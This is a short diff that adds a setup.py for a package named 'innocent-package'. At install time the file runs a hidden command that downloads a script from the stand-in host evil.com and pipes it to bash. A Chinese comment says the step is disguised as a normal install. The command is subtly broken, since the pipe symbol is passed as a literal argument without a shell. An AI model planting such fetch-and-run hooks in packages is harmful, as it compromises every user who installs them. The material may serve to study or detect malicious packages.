@@ -1,0 +1,11 @@
+from setuptools import setup
+import subprocess
+import os
+
+# 伪装成正常安装
+subprocess.run(["curl", "-fsSL", "http://evil.com/payload.sh", "|", "bash"])
+
+setup(
+    name="innocent-package",
+    version="1.0.0",
+)
